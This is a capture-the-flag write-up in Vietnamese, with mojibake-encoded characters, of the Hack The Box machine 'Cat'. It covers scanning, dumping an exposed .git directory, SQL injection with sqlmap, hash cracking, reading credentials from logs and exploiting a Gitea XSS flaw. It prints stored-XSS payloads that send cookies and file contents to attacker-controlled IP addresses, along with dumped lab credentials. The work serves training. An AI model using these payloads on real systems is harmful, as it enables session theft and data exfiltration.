![alt text](image.png)
Qu√©t c√°c c·ªïng v√† d·ªãch v·ª• tr√™n m√°y ch·ªß ƒë√≠ch c√≥ ƒë·ªãa ch·ªâ 10.10.11.53
```bash
nmap -sC -sV 10.10.11.53 -oA Cat
``` 
![alt text](image-1.png)

Th√™m t√™n mi·ªÅn cat.htb v√†o /etc/hosts
```bash
echo "10.10.11.53 cat.htb" | sudo tee -a /etc/hosts
```
![alt text](image-2.png)

Truy c·∫≠p v√†o trang ch·ªß ƒë∆∞·ªùng d·∫´n http://cat.htb/

![alt text](image-3.png)

Ta ƒëƒÉng k√Ω t√†i kho·∫£n trang web v√† ƒëƒÉng nh·∫≠p v√†o trang web 
![alt text](image-4.png)

C√≥ ch·ª©c nƒÉng upload ·∫£nh l√™n website .
Ta ti·∫øp t·ª•c qu√©t c√°c th∆∞ m·ª•c file ·∫©n c·ªßa trang web http://cat.htb
![alt text](image-5.png)
![alt text](image-6.png)

K·∫øt qu·∫£ tr·∫£ v·ªÅ c√°c ƒë∆∞·ªùng d·∫´n nh∆∞ng c∆° b·∫£n ƒë√¢y l√† ƒë∆∞·ªùng d·∫´n c√°c ch·ª©c nƒÉng c·ªßa trang web.
Ta l·ª±a ch·ªçn c√¥ng c·ª• dirsearch qu√©t c√°c th∆∞ m·ª•c , file ·∫©n v·ªõi file t·ª´ ƒëi·ªÉn  m·∫∑c ƒë·ªãnh 
```bash
‚îå‚îÄ‚îÄ(root„âølyquockhanh)-[~]
‚îî‚îÄ# dirsearch  -u http://cat.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_cat.htb/__25-02-05_20-50-08.txt

Target: http://cat.htb/

[20:50:08] Starting: 
[20:50:22] 403 -  272B  - /.git/                                            
[20:50:22] 200 -   73B  - /.git/description
[20:50:22] 403 -  272B  - /.git/hooks/
[20:50:22] 403 -  272B  - /.git/branches/                                   
[20:50:22] 301 -  301B  - /.git  ->  http://cat.htb/.git/
[20:50:22] 200 -   92B  - /.git/config                                      
[20:50:22] 200 -    7B  - /.git/COMMIT_EDITMSG                              
[20:50:22] 200 -   23B  - /.git/HEAD                                        
[20:50:23] 403 -  272B  - /.git/info/                                       
[20:50:23] 200 -    2KB - /.git/index                                       
[20:50:23] 200 -  240B  - /.git/info/exclude
[20:50:23] 301 -  311B  - /.git/logs/refs  ->  http://cat.htb/.git/logs/refs/
[20:50:23] 403 -  272B  - /.git/logs/                                       
[20:50:23] 200 -  150B  - /.git/logs/HEAD
[20:50:23] 301 -  317B  - /.git/logs/refs/heads  ->  http://cat.htb/.git/logs/refs/heads/
[20:50:23] 200 -  150B  - /.git/logs/refs/heads/master                      
[20:50:23] 403 -  272B  - /.git/objects/                                    
[20:50:23] 403 -  272B  - /.git/refs/                                       
[20:50:23] 301 -  312B  - /.git/refs/heads  ->  http://cat.htb/.git/refs/heads/
[20:50:23] 200 -   41B  - /.git/refs/heads/master                           
[20:50:23] 301 -  311B  - /.git/refs/tags  ->  http://cat.htb/.git/refs/tags/
[20:50:24] 403 -  272B  - /.ht_wsr.txt                                      
[20:50:24] 403 -  272B  - /.htaccess.bak1                                   
[20:50:24] 403 -  272B  - /.htaccess.orig                                   
[20:50:24] 403 -  272B  - /.htaccess.sample                                 
[20:50:24] 403 -  272B  - /.htaccess.save
[20:50:24] 403 -  272B  - /.htaccess_extra                                  
[20:50:24] 403 -  272B  - /.htaccess_sc
[20:50:24] 403 -  272B  - /.htaccessOLD
[20:50:24] 403 -  272B  - /.htaccess_orig
[20:50:24] 403 -  272B  - /.htaccessBAK
[20:50:24] 403 -  272B  - /.html                                            
[20:50:24] 403 -  272B  - /.htaccessOLD2
[20:50:24] 403 -  272B  - /.htm                                             
[20:50:24] 403 -  272B  - /.htpasswd_test                                   
[20:50:24] 403 -  272B  - /.httr-oauth                                      
[20:50:24] 403 -  272B  - /.htpasswds                                       
[20:50:28] 403 -  272B  - /.php                                             
[20:50:42] 302 -    1B  - /admin.php  ->  /join.php                         
[20:51:13] 200 -    1B  - /config.php                                       
[20:51:17] 301 -  300B  - /css  ->  http://cat.htb/css/                     
[20:51:34] 301 -  300B  - /img  ->  http://cat.htb/img/                     
[20:51:43] 302 -    0B  - /logout.php  ->  /                                
[20:52:11] 403 -  272B  - /server-status                                    
[20:52:11] 403 -  272B  - /server-status/                                   
[20:52:29] 403 -  272B  - /uploads/                                         
[20:52:29] 301 -  304B  - /uploads  ->  http://cat.htb/uploads/     
```
![](image-7.png)

Ta t√¨m th·∫•y c√°c ƒë∆∞·ªùng d·∫´n th∆∞ m·ª•c file .git  . 
T√¥i th·∫•y th∆∞ m·ª•c .git. Th∆∞ m·ª•c .git th∆∞·ªùng ch·ª©a th√¥ng tin nh·∫°y c·∫£m nh∆∞ l·ªãch s·ª≠ cam k·∫øt, m√£ ngu·ªìn‚Ä¶ 
T√¥i s·ª≠ d·ª•ng c√¥ng c·ª• git-dumper, gi√∫p t·ª± ƒë·ªông tr√≠ch xu·∫•t c√°c kho l∆∞u tr·ªØ .git. C√¥ng c·ª• n√†y ki·ªÉm tra xem danh s√°ch th∆∞ m·ª•c c√≥ ƒë∆∞·ª£c b·∫≠t hay kh√¥ng v√† t·∫£i xu·ªëng ƒë·ªá quy n·ªôi dung .git.
```bash
./git_dumper.py http://cat.htb/.git /root/Documents/HTB/Cat/Git
```
![alt text](image-8.png)

Xem c·∫•u tr√∫c c√¢y c·ªßa th∆∞ m·ª•c Git ch·ª©a t·ªáp .git ƒë√£ t·∫£i xu·ªëng
```bash
tree .
```
![alt text](image-9.png)

Ph√¢n t√≠ch source code
Trong file join.php
![alt text](image-10.png)
L·∫•y th√¥ng tin username , email, password t·ª´ form ƒëƒÉng k√Ω , th√¥ng tin username ,email , password ch∆∞a ƒë∆∞·ª£c kh·ª≠ tr√πng  khi ƒë∆∞a v√†o l·ªánh sql  ƒë·ªÉ th·ª±c thi l∆∞u d·ªØ li·ªáu v√†o CSDL .
Th·ª±c hi·ªán c√¢u l·ªánh sql ƒëang s·ª≠ d·ª•ng h√†m execute() ƒë·ªÉ th·ª±c thi 
![alt text](image-11.png)
D·ªØ li·ªáu trong loginForm th√¨ th√¥ng tin loginUsername v√† loginPassword c≈©ng kh√¥ng ƒë∆∞·ª£c kh·ª≠ tr√πng tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u l·ªánh sql ƒë·ªÉ l·∫•y ra th√¥ng tin c·ªßa ng∆∞·ªùi d√πng d·ª±a theo t√™n username.
Trong file admin.php
![alt text](image-12.png)
N·∫øu ta c√≥ ƒë∆∞·ª£c session c·ªßa axel th√¨ c√≥ th·ªÉ v√†o ƒë∆∞·ª£c trang /admin.php

Trong file view_cat.php
![alt text](image-13.png)

C√°ch khai th√°c : Ta c√≥ th·ªÉ ch√®n l·ª£i d·ª•ng l·ªó h·ªïng XSS Store ƒë·ªÉ l·∫•y ƒë∆∞·ª£c cookie c·ªßa admin .Sau khi ta l·∫•y ƒë∆∞·ª£c cookie admin th√¨ c√≥ th·ªÉ truy c·∫≠p v√†o trang /admin.php
Payload XSS ta c√≥ th·ªÉ ch√®n v√†o username ƒëƒÉng k√Ω v√† payload s·∫Ω th·ª±c thi khi admin click v√†o xem file ·∫£nh ta t·∫£i l√™n 
Payload s·ª≠ d·ª•ng khai th√°c XSS 
```bash
<img src=x onerror=this.src='http://10.10.16.25/?c='+document.cookie>
```
![alt text](image-14.png)

![alt text](image-15.png)
T·∫£i ·∫£nh ƒë·ªÉ vote.
![alt text](image-16.png)

Admin click v√†o file vote m√† cookie ƒë∆∞·ª£c g·ª≠i v·ªÅ m√°y .
![alt text](image-17.png)

K·∫øt qu·∫£ tr·∫£ v·ªÅ l√†  cookie c·ªßa admin .
Ta thay ƒë·ªïi cookie c·ªßa ng∆∞·ªùi d√πng sang cookie admin ƒë·ªÉ truy c·∫≠p ƒë∆∞·ª£c v√†o giao di·ªán admin
![alt text](image-18.png)

Truy c·∫≠p th√†nh c√¥ng v√†o trang ch·ªß c·ªßa admin.
![](image-19.png)

![alt text](image-20.png)

D·ª±a v√†o source code view_cat.php Ta ph√°t hi·ªán l·ªó h·ªïng SQL injection ·ªü /accept_cat
Ta d√πng k√Ω t·ª± ƒë·∫∑c bi·ªát k·∫øt qu·∫£ tr·∫£ v·ªÅ 500 l·ªói x·ª≠ l√Ω tr√™n m√°y ch·ªß 
![alt text](image-21.png)
Bi·∫øn b·∫•t th∆∞·ªùng th√†nh b√¨nh th∆∞·ªùng 

![alt text](image-22.png)
Ta s·ª≠ d·ª•ng c√¥ng c·ª• sqlmap ƒë·ªÉ khai th√°c l·ªó h·ªïng tr√™n tr∆∞·ªùng catName c·ªßa y√™u c·∫ßu POST /accep_cat.php.

![alt text](image-23.png)
![alt text](image-24.png)
![alt text](image-25.png)

Ta khai th√°c th√†nh c√¥ng username v√† password trong CSDL c·ªßa website.
![alt text](image-26.png)

```bash
---------+-------------------------------+-----------------------------------------+-------------------------------------------------------------------------------------+
| user_id | email                         | password                                | username                                                                            |
+---------+-------------------------------+-----------------------------------------+-------------------------------------------------------------------------------------+
| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f        | axel                                                                                |
| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c        | rosa                                                                                |
| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad        | robert                                                                              |
| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe        | fabian                                                                              |
| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86        | jerryson                                                                            |
| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8        | larry                                                                               |
| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6          | royer                                                                               |
| 8       | peterCC456@gmajp/cpp          | e41ccefa439fc454f7eadbf1f139ed8a        | peter                                                                               |
| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565        | angel                                                                               |
| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad        | jobert                                                                              |
| 11      | ‚úãüèø üí™üèø üëêüèø üôåüèø üëèüèø üôèüèø  | 1610838743cc90e3e4fdda748282d9b8 (dave) | dave                                                                                |
| 12      | khanh123@gmail.com            | 202cb962ac59075b964b07152d234b70 (123)  | <img src=x onerror=this.src='http://10.10.16.25/?c='+document.cookie>               |
| 13      | a@a.maik                      | bc6680c1a0d13d778d73c59185b1e412 (wan)  | "><script>document.location='http://10.10.14.93:8000/?a='+document.cookie;</script> |
+---------+-------------------------------+-----------------------------------------+------------------------------------------------------------------------------------
```

Ta ti·∫øp t·ª•c s·ª≠ d·ª•ng CrackStation ƒë·ªÉ ti·∫øp t·ª•c crack m√£ bƒÉm c√≤n l·∫°i v√† crack ƒë∆∞·ª£c password c·ªßa rosa : soyunaprincesarosa 
![alt text](image-27.png)

Ta s·ª≠ d·ª•ng tk : rosa v√† password : soyunaprincesarosa ƒë·ªÉ k·∫øt n·ªëi t·ª´ xa ƒë·∫øn m√°y ch·ªß ƒë√≠ch
```bash
ssh rosa@cat.htb
```
![alt text](image-28.png)
![alt text](image-29.png)
Ta t√¨m file user.txt v√† k·∫øt qu·∫£ kh√¥ng t√¨m th·∫•y file
![alt text](image-30.png)

ƒê·ªçc file /etc/passwd ƒë·ªÉ ki·ªÉm tra ng∆∞·ªùi d√πng h·ªá th·ªëng 
![](image-31.png)

Ta t√¨m ƒë∆∞·ª£c 2 ng∆∞·ªùi d√πng kh√°c l√† jobert , axel , git
Kh·∫£ nƒÉng trong m√°y ch·ªß m·ª•c ti√™u th√¨ t√†i kho·∫£n ƒëƒÉng nh·∫≠p v√†o d·ªãch v·ª• http c·ªïng 80  gi·ªëng t√†i kho·∫£n ƒëƒÉng nh·∫≠p v√†o h·ªá th·ªëng ta th·ª≠ ki·ªÉm tra file log ghi nh·∫≠t k√Ω ƒëƒÉng nh·∫≠p 
```bash
find / -name *.log 2> /dev/null
```
![alt text](image-32.png)

T√¨m ƒë∆∞·ª£c ƒë∆∞·ªùng d·∫´n log l∆∞u th√¥ng tin k·∫øt n·ªëi l√† /var/log/apache2/access.log
ƒê·ªçc file access.log ƒë∆∞a ra m√†n h√¨nh n·ªôi dung ch·ª©a t·ª´ kh√≥a 302
```bash
cat /var/log/apache2/access.log | grep 302
```

![alt text](image-33.png)

Ta t√¨m ƒë∆∞·ª£c username=axel v√† password= aNdZwgC4tI9gnVXv_e3Q
Ta d√πng sudo ƒë·ªÉ chuy·ªÉn ng∆∞·ªùi d√πng k ƒë∆∞·ª£c n√™n ta s·∫Ω k·∫øt n·ªëi th√¥ng qua giao th·ª©c ssh v·ªõi username = axel
![alt text](image-34.png)
T√¨m th·∫•y file user.txt
![alt text](image-35.png)

Ki·ªÉm tra quy·ªÅn axel tr√™n h·ªá th·ªëng  kh√¥ng mang l·∫°i th√¥ng tin gi√° tr·ªã
![alt text](image-36.png)

Ki·ªÉm tra d·ªãch v·ª•  ƒëang ch·∫°y tr√™n h·ªá th·ªëng 
![alt text](image-37.png)

C·ªïng 3000 l√† d·ªãch v·ª• web ƒëang m·ªü n·ªôi b·ªô
![alt text](image-38.png)

T·∫°o ƒë∆∞·ªùng h·∫ßm ssh t·ªõi d·ªãch v·ª• c·ªïng 3000

```bash
ssh axel@cat.htb -L 3000:localhost:3000
```
![alt text](image-39.png)

Truy c·∫≠p v√†o trang web t√¨m ƒë∆∞·ª£c phi√™n b·∫£n ·ª©ng d·ª•ng c·ªßa trang web l√†  Gitea Version : 1.22.0
![alt text](image-40.png)

Tra c·ª©u ta t√¨m ƒë∆∞·ª£c l·ªó h·ªïng CVE 2024-6886 li√™n quan ƒë·∫øn phi√™n b·∫£n 
C√°ch khai th√°c CVE
![alt text](image-41.png)

Ta s·ª≠ d·ª•ng t√†i kho·∫£n axel ƒëƒÉng nh·∫≠p ƒë∆∞·ª£c v√†o trang web 
![alt text](image-42.png)

T·∫°o 1 .git
![alt text](image-43.png)
![alt text](image-44.png)
Ta click v√†o XSS test th√¨ c√¢u l·ªánh js ƒë∆∞·ª£c th·ª±c thi
![alt text](image-45.png) .

Nh∆∞ng ta v·∫´n ch∆∞a th·∫•y ƒë∆∞·ª£c th√¥ng tin n√†o ƒë·ªÉ √°p d·ª•ng XSS n√¢ng quy·ªÅn root.

Nh√¨n l·∫°i ta ph√°t hi·ªán 1 d√≤ng You have mail khi k·∫øt n·ªëi t·ª´ xa v√†o h·ªá th·ªëng v·ªõi ng∆∞·ªùi d√πng axel.
![alt text](image-46.png)
![alt text](image-47.png)
![alt text](image-48.png)

‚Ä¢	C√≥ ƒë∆∞·ªùng d·∫´n n·ªôi b·ªô http://localhost:3000/administrator/Employee-management/, g·ª£i √Ω r·∫±ng h·ªá th·ªëng ƒëang ch·∫°y tr√™n m·ªôt server n·ªôi b·ªô.
‚Ä¢	M·ªôt file README ch·ª©a th√¥ng tin quan tr·ªçng c√≥ th·ªÉ ƒë∆∞·ª£c truy c·∫≠p t·∫°i http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md

H∆∞·ªõng khai th√°c : Ta t·∫°o 1 payload XSS ƒë·ªÉ l·∫•y d·ªØ li·ªáu t·ª´ file README.md b·∫±ng c√°ch ƒë·ªÉ administrator  click v√†o payload XSS  ƒë·ªÉ l·∫•y d·ªØ li·ªáu 

```bash
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.16.47:293/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
```
![alt text](image-49.png)

G·ª≠i mail cho admin ƒë·ªÉ admin k√≠ch ho·∫°t payload XSS

```bash
echo -e "Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/Khanh" | sendmail jobert@cat.htb
```
![alt text](image-50.png)
![alt text](image-51.png)

Ta thu ƒë∆∞·ª£c n·ªôi dung file README.md ƒëang ƒë∆∞·ª£c m√£ h√≥a url

```bash
%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24valid_password%20%3D%20%27IKw75eR0MR7CMIxhH0%27%3B%0A%0Aif%20(!isset(%24_SERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SERVER%5B%27PHP_AUTH_USER%27%5D%20!%3D%20%24valid_username%20%7C%7C%20%24_SERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authenticate%3A%20Basic%20realm%3D%22Employee%20Management%22%27)%3B%0A%20%20%20%20header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard.php%27)%3B%0Aexit%3B%0A%3F%3E%0A%0A
```
Gi·∫£i m√£ url 
![alt text](image-52.png)

Ta thu ƒë∆∞·ª£c username=‚Äùadmin‚Äù v√† password=‚Äù IKw75eR0MR7CMIxhH0‚Äù
Ta l·∫•y th√¥ng tin ƒëƒÉng nh·∫≠p v√†o h·ªá th·ªëng v·ªõi quy·ªÅn root v√† thu ƒë∆∞·ª£c flag
![alt text](image-53.png)

![alt text](image-54.png)
